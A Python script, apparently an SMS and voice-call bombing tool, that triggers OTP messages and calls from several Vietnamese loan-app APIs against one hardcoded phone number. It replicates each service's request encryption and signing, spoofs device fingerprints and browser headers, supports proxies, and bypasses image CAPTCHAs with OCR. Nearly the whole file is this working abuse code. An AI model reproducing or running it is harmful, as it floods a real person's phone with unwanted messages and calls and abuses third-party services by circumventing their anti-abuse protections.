import os
import re
import requests
import time
import uuid
import base64
import hashlib
import json
import io
from typing import Optional, Any
from urllib.parse import urlparse
from Crypto.Cipher import AES, PKCS1_v1_5 as RSA_PKCS1
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image, ImageEnhance
import ddddocr

# Pillow's type stubs expose this flag as Literal[False], although it is
# intentionally mutable at runtime for handling truncated image responses.
setattr(ImageFile, "LOAD_TRUNCATED_IMAGES", True)
_ocr = ddddocr.DdddOcr(show_ad=False)

import base64
import json
import random
import requests

from urllib.parse import urlparse
from Crypto.Cipher import AES, PKCS1_v1_5 as RSA_PKCS1
from Crypto.PublicKey import RSA


_BANANA_RSA_PUB = RSA.import_key(
    "-----BEGIN PUBLIC KEY-----\n"
    "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCf2LshP9miHsmcC4FtbGsOgwla\n"
    "MHHL3VLa8ervlaYY5/fw4yOYdsgnYqr7Wu+OfM2GWCnVFzpVjzxAuwpKPlMcMnUR\n"
    "NNhD9LwJN9eaGVX3A6OXpJjmPu3NmhSQB4Tdi7so/0Vb+WCFbsw1x6OO+Zs0+zm\n"
    "RS5WWL3JDfXYyxozA3QIDAQAB\n"
    "-----END PUBLIC KEY-----"
)


def _pkcs7_pad(data, bs=16):
    p = bs - len(data) % bs
    return data + bytes([p] * p)


def _banana_rnd_key():
    return "".join(
        random.choices(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            k=16,
        )
    )


def _banana_send(
    phone: str,
    url: str,
    loan_name: str,
    label: str,
    use_proxy: bool = True,
) -> bool:
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    def _rsa_enc(k: str) -> str:
        return base64.b64encode(
            RSA_PKCS1.new(_BANANA_RSA_PUB).encrypt(k.encode())
        ).decode()

    def _aes_enc(payload: dict, k: str) -> str:
        raw = json.dumps(
            payload,
            separators=(",", ":"),
            ensure_ascii=False,
        ).encode()

        ct = AES.new(
            k.encode(),
            AES.MODE_ECB,
        ).encrypt(_pkcs7_pad(raw))

        return base64.b64encode(ct).decode()

    def _hdrs(k: str) -> dict:
        return {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn",
            "appType": "1",
            "osType": "1",
            "Origin": origin,
            "Referer": origin + "/",
            "NEW_APP_ENC": _rsa_enc(k),
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                "Version/18.1 Mobile/15E148 Safari/604.1"
            ),
        }

    event_url = f"{origin}/app-domain/api/burying/unauthenticated/event"

    proxies = None
    proxy_url = os.getenv("FV_BANANA_PROXY")
    if use_proxy and proxy_url:
        proxies = {"http": proxy_url, "https": proxy_url}

    try:
        with requests.Session() as session:
            # Request event
            try:
                k1 = _banana_rnd_key()

                session.post(
                    event_url,
                    headers=_hdrs(k1),
                    json={
                        "key": _aes_enc(
                            {
                                "eventKey": "LOGIN_SMS",
                                "packageName": loan_name,
                                "phone": phone,
                            },
                            k1,
                        )
                    },
                    timeout=8,
                    proxies=proxies,
                )

            except Exception:
                pass

            k2 = _banana_rnd_key()

            r = session.post(
                url,
                headers=_hdrs(k2),
                json={
                    "key": _aes_enc(
                        {
                            "smsType": "1",
                            "phone": phone,
                            "loanProductName": loan_name,
                        },
                        k2,
                    )
                },
                timeout=20,
                proxies=proxies,
            )

        print(
            f"[{label}] HTTP {r.status_code}; "
            f"content-type={r.headers.get('Content-Type', '')}; "
            f"bytes={len(r.content)}"
        )
        try:
            outer = r.json()
            encrypted = outer.get("key") if isinstance(outer, dict) else None
            if not isinstance(encrypted, str) or not encrypted:
                print(f"[{label}] Response không có trường key: {r.text[:300]}")
                return False

            decrypted = AES.new(k2.encode(), AES.MODE_ECB).decrypt(
                base64.b64decode(encrypted, validate=True)
            )
            decoded = json.loads(unpad(decrypted, AES.block_size).decode("utf-8"))
            print(f"[{label}] Decrypted response: {decoded}")

            ok = bool(
                decoded.get("ok")
                or decoded.get("success")
                or str(decoded.get("code", "")) in ("0", "1", "200")
            )
        except (KeyError, TypeError, ValueError, UnicodeDecodeError) as exc:
            print(f"[{label}] Không giải mã được response: {type(exc).__name__}: {exc}")
            return False

        return ok

    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        return False


def sent(phone):
    phone = re.sub(r"\D", "", str(phone))
    if not re.fullmatch(r"0\d{9}", phone):
        print(f"[FVbanana] Số điện thoại không hợp lệ: {phone!r}")
        return False
    return _banana_send(
        phone,
        "https://www.fvbanana.top/app-domain/api/user/sentSms",
        "Fast_Vay",
        "Thành Công",
    )        

def mfast_1(phone):
    url = "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone"

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://fin.mfast.vn",
        "Referer": "https://fin.mfast.vn/",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/18.1 Mobile/15E148 Safari/604.1"
        ),
        "Accept-Language": "vi-VN,vi;q=0.9",
    }

    data = {
        "phone": phone,
        "type": "phone",
        "code": "891234",
    }
    try:
        r = requests.post(
            url,
            headers=headers,
            data=data
        )

        if r.ok:
            print(f"[SEND][Thành Công] {r.status_code}")
        else:
            print(f"[SEND][Thất Bại] {r.status_code}")

    except requests.RequestException as e:
        print(f"[Thất Bại] {type(e).__name__}: {e}")
        return {}


def mfast(phone):
    phone_number = "84" + phone[1:] if phone.startswith("0") else phone   
    url = "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone"

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://fin.mfast.vn",
        "Referer": "https://fin.mfast.vn/",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/18.1 Mobile/15E148 Safari/604.1"
        ),
        "Accept-Language": "vi-VN,vi;q=0.9",
    }

    data = {
        "phone": phone_number,
        "type": "phone",
        "code": "891234",
    }
    try:
        r = requests.post(
            url,
            headers=headers,
            data=data
        )
        if r.ok:
            print(f"[SEND][Thành Công] {r.status_code}")
        else:
            print(f"[SEND][Thất Bại] {r.status_code}")

    except requests.RequestException as e:
        print(f"[Thất Bại] {type(e).__name__}: {e}")
        return {}

def call1(phone):
    base_url = "https://vidutru.com"
    headers = {
        "Accept": "*/*",
        "App-ID": "A61637",
        "App-Version": "1.0.3",
        "source": "ios",
        "locale": "vi-VN",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Language": "vi_VN",
        "Access-Token": "",
        "User-Agent": "ios",
        "Connection": "keep-alive",
        "Country": "Vietnam",
    }

    try:
        with requests.Session() as session:
            session.headers.update(headers)

            # Request 1: check user/register
            response = session.post(
                f"{base_url}/api/scone-app/register/check/user/register",
                json={"phone": phone},
                timeout=20,
            )

            print("[CHECK]", response.status_code)

            try:
                check_data = response.json()
            except (ValueError, TypeError):
                return None

            if response.status_code != 200:
                return check_data

            response = session.get(
                f"{base_url}/api/scone-app/register/send/code/Vidutru",
                params={
                    "campaign": "",
                    "isTool": "1",
                    "mediaSource": "",
                    "phone": phone,
                    "sendType": "VOICE",
                    "type": "LOGIN_OR_REGISTER",
                },
                timeout=20,
            )

            if response.ok:
                print(f"[SEND][Thành Công] {response.status_code}")
            else:
                print(f"[SEND][Thất Bại] {response.status_code}")

    except requests.RequestException as e:
        print(f"[Thất Bại] {type(e).__name__}: {e}")
        return {}

def tiennhanh_check(phone):
    url = "https://tiennhanh.xyz/api/scone-app/register/check/user/register"

    headers = {
        "Referer": "https://tnp.tiennhanh.xyz/",
        "source": "h5",
        "Language": "vi_VN",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/18.1 Mobile/15E148 Safari/604.1"
        ),
        "App-ID": "A26859",
        "Country": "Vietnam",
        "Origin": "https://tnp.tiennhanh.xyz",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=3, i",
        "domain": "tnp.tiennhanh.xyz",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "App-Version": "1.0.0",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "cors",
    }

    data = {
        "phone": phone,
    }

    try:
        r = requests.post(
            url,
            headers=headers,
            json=data,
            timeout=20,
        )

        if r.ok:
            print(f"[CHECK][Thành Công] {r.status_code}")
        else:
            print(f"[CHECK][Thất Bại] {r.status_code}")

        try:
            return r.json()
        except (ValueError, TypeError):
            return {}

    except requests.RequestException as e:
        print(f"[CHECK][Thất Bại] {type(e).__name__}: {e}")
        return {}

def tiennhanh_send(phone):
    url = "https://tiennhanh.xyz/api/scone-app/register/send/code/TNhanhPay"

    headers = {
        "Referer": "https://tnp.tiennhanh.xyz/",
        "source": "h5",
        "Language": "vi_VN",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/18.1 Mobile/15E148 Safari/604.1"
        ),
        "Cookie": "JSESSIONID=E246DDEE72FEB427803863694E417EE1",
        "App-ID": "A26859",
        "Country": "Vietnam",
        "Origin": "https://tnp.tiennhanh.xyz",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=3, i",
        "domain": "tnp.tiennhanh.xyz",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "turnstile-token": "1.YPkG6fYF4D76IejC89Vsbn8p3so2nC7R_1ToKS4YAzb3aZv95JXfYgsh26pDsvwZ5CMmeSjdiXX-ALCR_a6MAX6CtAvNY5fRU3edc1qnyp59PrtFtAZLmjiG7wNKiKygYe5IclnGC4W7gCstWRZ2TrWmouJBgGLekOaKjSYBXrbDeFch6_JEsSL8ABaAYerdR4dNfdo-iSlHgv79O9zjHSszUzewtbixLHjlegR04GqJ2eTeKHKT-gCLkwSs0xSmEVj27oR-bTIkfpcKGapYW_vRavqZqgmKBi5V7ad1TwrU6WvhpjrV0XhY2P1g2_J5SDFW8blKEL5Cz2eRyBcXHT5W3dMN-iqOIEGyit1ZXZF6scBTrz8oQy23KPt1k1972iC5SQXB3Kv7weu34KqPEiK2ZVJWa24GU70LDQ_j8E4758Dx41Isn5cdHUaMO7K9_iejQYZeBMz7hhtdGkpg8KZPPV2mEVBY06TM5gEuCx5qJUrHyowW00Wand7WgEd1LP2cHE8gt8d7P_D5uCEs-Y6dF3ZtaLlBDAeTr1YY30457_C83Roh2NxtRyXFGr03UnoaRKhOJ7DZvSSdxpeq9NBOOaVXwrnlWSqj0xgcNB40ra5d75eFygb43mfqn0PHNuv8uiNkSwHGwUDKhMbgypBArs3eKNKMbsuGhKDpJBI.N5-f5cdPAGgi7_sJr5RR9g.b5b347570d61dd6a06b83c0cda08f245b59494aead4c3a005d6db7895fb5c826",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "App-Version": "1.0.0",
        "Sec-Fetch-Mode": "cors",
    }

    params = {
        "phone": phone,
        "type": "LOGIN_OR_REGISTER",
        "sendType": "VOICE",
    }
    try:
        r = requests.get(
            url,
            headers=headers,
            params=params,
            timeout=20,
        )
        if r.ok:
            print(f"[SEND][Thành Công] {r.status_code}")
        else:
            print(f"[SEND][Thất Bại] {r.status_code}")

        try:
            return r.json()
        except (ValueError, TypeError):
            return {}
    except requests.RequestException as e:
        print(f"[SEND][Thất Bại] {type(e).__name__}: {e}")
        return {}


WEB_ORIGIN = "https://web.cash-lemon.com"
API_ORIGIN = "https://api.cash-lemon.com"
FINGERPRINT_ORIGIN = "https://dfp-vn.xuanjirc.com"
FINGERPRINT_ORGANIZATION = "2022072009308201"
PRODUCT_ID = "20003"
CHANNEL_CODE = "H1h82"
APP_VERSION = "3.1.9"
SALT_TTL_MS = 10_000

USER_AGENT = os.getenv(
    "LEMON_USER_AGENT",
    (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) "
        "Version/18.1 Mobile/15E148 Safari/604.1"
    ),
)

_session = requests.Session()
_session.headers.update(
    {
        "Accept": "*/*",
        "Origin": WEB_ORIGIN,
        "Referer": f"{WEB_ORIGIN}/",
        "User-Agent": USER_AGENT,
        "Accept-Language": "vi-VN,vi;q=0.9",
    }
)
_fingerprint: str | None = None
_salt = ""
_salt_timestamp = 0

def _json_response(response: requests.Response) -> dict[str, Any] | None:

    text = response.text.strip()
    if not text:
        return None

    candidates = [text]
    padded = text + "=" * (-len(text) % 4)
    if re.fullmatch(r"[A-Za-z0-9+/]+={0,2}", padded):
        try:
            candidates.append(base64.b64decode(padded, validate=True).decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            pass

    for candidate in candidates:
        try:
            value = json.loads(candidate)
        except (TypeError, ValueError):
            continue
        if isinstance(value, dict):
            return value
    return None


def _fingerprint_device_data() -> dict[str, Any]:
    return {
        "webSmartId": uuid.uuid4().hex,
        "userAgent": USER_AGENT,
        "webdriver": "",
        "browserLanguage": "vi-VN",
        "scrColorDepth": 24,
        "timeZone": "+7",
        "timeZoneName": "Asia/Saigon",
        "sessionStorage": True,
        "localStorage": True,
        "indexedDb": True,
        "openDatabase": False,
        "os": "iPhone",
        "doNotTrack": "unknown",
        "plugins": "[]",
        "adblock": "",
        "deviceMemory": "",
        "vendor": "Apple Computer, Inc.",
        "vendorFlavors": "[]",
        "touchSupport": '{"maxTouchPoints":5,"touchEvent":true,"touchStart":true}',
        "javaEnabled": "0",
        "scrDeviceXDPI": "[390,844]",
        "cookieEnabled": "1",
        "flashVersion": 0,
        "scrHeight": 663,
        "scrWidth": 390,
        "scrAvailHeight": 844,
        "scrAvailWidth": 390,
        "browserName": "Netscape",
        "sdkVersion": "4.6.3",
        "storeDb": "itrueltrueofalsestrue",
        "srcScreenSize": "24xx844x390",
        "scrAvailSize": "844x390",
    }


def _get_fingerprint() -> str:
    global _fingerprint
    if _fingerprint:
        return _fingerprint

    envelope = {
        "organization": FINGERPRINT_ORGANIZATION,
        "fpEncode": 1,
        "os": "web",
        "systemNo": "ios",
        "deviceData": json.dumps(
            _fingerprint_device_data(), separators=(",", ":")
        ),
    }
    encoded = base64.b64encode(
        json.dumps(envelope, separators=(",", ":")).encode("utf-8")
    ).decode("ascii")
    response = _session.get(
        f"{FINGERPRINT_ORIGIN}/dfp/web/profile?{encoded}",
        headers={"Referer": f"{WEB_ORIGIN}/"},
        timeout=(10, 30),
    )
    response.raise_for_status()
    match = re.search(r"callbackFunction\('(.+)'\)", response.text.strip())
    if match:
        data = json.loads(match.group(1))
    else:
        data = json.loads(response.text)
    value = data.get("dfp") if isinstance(data, dict) else None
    if not value:
        raise RuntimeError("Fingerprint service không trả về dfp")

    _fingerprint = str(value)
    _session.cookies.set(
        "KZ_FINGER", _fingerprint, domain=".cash-lemon.com", path="/"
    )
    return _fingerprint


def _get_salt() -> str:
    global _salt, _salt_timestamp
    now = int(time.time() * 1000)
    if _salt and now - _salt_timestamp <= SALT_TTL_MS:
        return _salt

    response = _session.get(
        f"{WEB_ORIGIN}/img/favicon{PRODUCT_ID}.ico?t={now}",
        headers={"Content-Type": "text/plain;charset=UTF-8"},
        timeout=(10, 30),
    )
    response.raise_for_status()
    raw = response.content.decode("latin-1")
    if len(raw) <= 10:
        raise RuntimeError("Không lấy được salt từ favicon")

    _salt = raw[4:-6].replace("|", "")
    _salt_timestamp = int(time.time() * 1000)
    if not _salt:
        raise RuntimeError("Salt rỗng")
    return _salt


def _js_scalar(value: Any) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    return str(value)


def _make_sign(payload: dict[str, Any], salt: str) -> str:
    values: dict[str, Any] = {}
    for key, value in (payload.get("bizParams") or {}).items():
        if isinstance(value, (str, int, float, bool)) or value is None:
            values[key] = value
        else:
            values[key] = json.dumps(value, separators=(",", ":"))

    values["timestamp"] = payload.get("timestamp")
    values["phoneNumber"] = payload.get("phoneNumber")
    values["token"] = payload.get("token")

    parts = []
    for key in sorted(values):
        value = values[key]
        if value in ("", None, "null"):
            continue
        parts.append(f"{key}={_js_scalar(value)}")
    canonical = "&".join(parts)
    return hashlib.md5((canonical + salt).encode("utf-8")).hexdigest()


def _base_payload(phone: str, biz_params: dict[str, Any]) -> dict[str, Any]:
    fingerprint = _get_fingerprint()
    payload: dict[str, Any] = {
        "baseParams": {
            "platformId": "ios",
            "deviceType": "h5",
            "deviceIdKh": fingerprint,
            "termSysVersion": "18.1",
            # The H5 bundle only extracts a model when the UA contains an
            # identifier such as "iPhone15,2"; the Safari UA above does not.
            "termModel": "",
            "brand": "Apple Computer, Inc.",
            "isPwa": 0,
            "imei": "",
            "termId": None,
            "appType": "6",
            "appVersion": APP_VERSION,
            "pValue": "",
            "lon": "",
            "lat": "",
            "bizType": "0000",
            "appName": "Lemon Cash",
            "packageName": "com.lemoncashvn.web",
            "screenResolution": "1170,2532",
        },
        "clientTypeFlag": "h5",
        "token": "",
        # The web client reads this from cookie/localStorage.  During the
        # pre-login flow it is empty; the submitted number remains in
        # bizParams.phoneNum.
        "phoneNumber": "",
        "timestamp": str(int(time.time() * 1000)),
        "bizParams": biz_params,
    }
    payload["sign"] = _make_sign(payload, _get_salt())
    return payload


def get_login_type(phone: str) -> dict[str, Any] | None:
    payload = _base_payload(phone, {"phoneNum": phone})
    try:
        response = _session.post(
            f"{API_ORIGIN}/app/member/getLoginType",
            headers={"Content-Type": "text/plain;charset=UTF-8"},
            data=json.dumps(payload, separators=(",", ":")),
            timeout=(10, 30),
        )
        print(f"[getLoginType] HTTP {response.status_code}")
        data = _json_response(response)
        print(f"[getLoginType] Data: {data}")
        if response.status_code != 200:
            return None
        return data
    except (requests.RequestException, ValueError, RuntimeError) as exc:
        print(f"[getLoginType] ERR {type(exc).__name__}: {exc}")
        return None


def get_validate_code(phone: str) -> bytes | None:
    _get_fingerprint()
    try:
        response = _session.get(
            f"{API_ORIGIN}/getValidateCode",
            params={"mobile": phone, "timestamp": int(time.time() * 1000)},
            headers={
                "Accept": "image/webp,image/avif,image/jpeg,image/*;q=0.8,*/*;q=0.5",
                "Sec-Fetch-Dest": "image",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "no-cors",
            },
            timeout=(10, 30),
        )
        print(f"[ValidateCode] HTTP {response.status_code}")
        print(f"[ValidateCode] Content-Type: {response.headers.get('Content-Type')}")
        if response.status_code != 200:
            return None
        if not response.headers.get("Content-Type", "").startswith("image/"):
            print("[ValidateCode] ✗ Response không phải ảnh")
            return None
        print(f"[ValidateCode] Image bytes: {len(response.content)}")
        return response.content
    except requests.RequestException as exc:
        print(f"[ValidateCode] ERR {type(exc).__name__}: {exc}")
        return None


def _solve_captcha(image_bytes: bytes) -> str:
    try:
        import ddddocr
    except ImportError as exc:
        raise RuntimeError("Thiếu ddddocr; cài dependencies trong requirements.txt") from exc

    def run_ocr(image: Image.Image) -> str:
        buffer = io.BytesIO()
        image.convert("RGB").save(buffer, format="PNG")
        result = ddddocr.DdddOcr(show_ad=False).classification(buffer.getvalue())
        return result.strip() if isinstance(result, str) else ""

    image = Image.open(io.BytesIO(image_bytes))
    image.load()
    candidates = [
        run_ocr(image),
        run_ocr(ImageEnhance.Contrast(image.convert("RGB")).enhance(2.0)),
        run_ocr(image.convert("L").convert("RGB")),
        run_ocr(
            ImageEnhance.Contrast(image.convert("L").convert("RGB")).enhance(3.0)
        ),
    ]
    cleaned = [
        re.sub(r"[^A-Za-z0-9]", "", item)
        for item in candidates
    ]
    valid = [item for item in cleaned if 4 <= len(item) <= 8]
    if not valid:
        longest = ""
        for item in cleaned:
            if len(item) > len(longest):
                longest = item
        return longest

    # Nếu nhiều biến thể OCR đồng ý, ưu tiên kết quả lặp lại.
    counts = {item: valid.count(item) for item in set(valid)}
    repeated = [item for item in valid if counts[item] >= 2]
    if repeated:
        best = ""
        best_count = -1
        for item in repeated:
            count = counts[item]
            if count > best_count or (
                count == best_count and len(item) > len(best)
            ):
                best = item
                best_count = count
        return best
    longest = ""
    for item in valid:
        if len(item) > len(longest):
            longest = item
    return longest


def send_sms_code(phone: str, code: str | None = None) -> bool:
    phone = phone.strip()
    if phone.startswith("+84"):
        phone = "0" + phone[3:]
    elif phone.startswith("84"):
        phone = "0" + phone[2:]
    elif not phone.startswith("0"):
        phone = "0" + phone

    # The H5 flow always performs this check before displaying the image
    # CAPTCHA or sending the SMS request.
    login_type = get_login_type(phone)
    need_validate_code = True
    if isinstance(login_type, dict) and login_type.get("success") is True:
        data = login_type.get("data")
        if isinstance(data, dict):
            need_validate_code = bool(data.get("needValidateCode"))
            print(
                "[SendSMS] getLoginType needValidateCode="
                f"{need_validate_code}"
            )

    if not code and need_validate_code:
        image = get_validate_code(phone)
        if not image:
            raise RuntimeError("Không lấy được ảnh mã xác nhận")
        code = _solve_captcha(image)
        if not code:
            raise RuntimeError("Không đọc được mã xác nhận")
        print(f"[SendSMS] OCR đã chọn mã có {len(code)} ký tự")

    payload = _base_payload(
        phone,
        {
            "phoneNum": phone,
            "code": code,
            "type": 200,
            "channelCode": CHANNEL_CODE,
        },
    )
    try:
        response = _session.post(
            f"{API_ORIGIN}/app/member/sendSmsCode",
            headers={"Content-Type": "text/plain;charset=UTF-8"},
            data=json.dumps(payload, separators=(",", ":")),
            timeout=(10, 30),
        )
        print(f"[SendSMS] HTTP {response.status_code}")
        data = _json_response(response)
        print(f"[SendSMS] Data: {data}")
        return response.status_code == 200 and bool(data and data.get("success") is True)
    except (requests.RequestException, ValueError, RuntimeError) as exc:
        print(f"[SendSMS] ERR {type(exc).__name__}: {exc}")
        return False

def tientay24(phone: str):
    url = "https://api.tientay24.com/vn/api/v6/1PrHVB"

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Authorization": "",
        "Device-Info": "eyJhcHBOYW1lIjoiVGllblRheTI0IiwiYXBwVmVyc2lvbiI6IjEuMC4yIiwiY291bnRyeUNvZGUiOiJWTiIsImNvdW50cnlOYW1lIjoiVmlldG5hbSIsInBob25lQnJhbmQiOiJBcHBsZSIsInBob25lQnJhbmRNb2RlbCI6ImlQaG9uZSIsInV1aWQiOm51bGwsImltZWkiOiIiLCJpbXNpIjoiIiwiYW5kcm9pZElkIjoiMWJlNTg4ODZhMmIxM2ZiYWZmMTliNjM3M2ViZmQxMTMiLCJtYWMiOiIiLCJzeXN0ZW1QbGF0Zm9ybSI6ImlvcyIsInN5c3RlbVZlcnNpb24iOiIxOC4xIiwiZGVsaXZlcnlQbGF0Zm9ybSI6InB3YSIsImFkSWQiOiIxYmU1ODg4NmEyYjEzZmJhZmYxOWI2MzczZWJmZDExMyIsImFkQ2hhbm5lbCI6IiIsImRldmljZU5vIjoiMWJlNTg4ODZhMmIxM2ZiYWZmMTliNjM3M2ViZmQxMTMiLCJwYWNrYWdlTmFtZSI6ImNvbS50aWVudGF5MjQucHdhIiwiY3B1Q29yZXMiOi0xLCJtZW1vcnlUb3RhbCI6LTEsInNkQ2FyZFRvdGFsIjotMSwiaWRmdiI6IiIsImlkZmEiOiIifQ==",
        "Accept-Language": "vi-VN",
        "Origin": "https://h5app.tientay24.com",
        "Referer": "https://h5app.tientay24.com/",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    }

    payload = {
        "mobileNo": phone,
        "smsType": 2,
    }

    try:
        r = requests.post(
            url,
            headers=headers,
            json=payload,
            timeout=15,
        )

        data = r.json()

        print(f"[Tientay24] HTTP {r.status_code}")
        print(data)

        return (
            r.status_code == 200
            and data.get("code") == "000000"
            and data.get("success") is True
        )

    except (requests.RequestException, ValueError) as e:
        print(f"[Tientay24] ERR {type(e).__name__}: {e}")
        return False

if __name__ == "__main__":
    phone = "0983286226"

    print("=== TEST ===")


    print("\n[1] FVbanana")
    print(sent(phone))


    print("\n[1] mfast_1")
    print(mfast_1(phone))


    print("\n[3] call1")
    print(call1(phone))


    print("\n[2] mfast")
    print(mfast(phone))


    print("\n[4] tiennhanh_check")
    print(tiennhanh_check(phone))

    print("\n[5] tiennhanh_send")
    print(tiennhanh_send(phone))


    print("\n[4] tientay_check")
    print(tientay24(phone))

    print("\n[5] fistgo_send")
    print(send_sms_code(phone))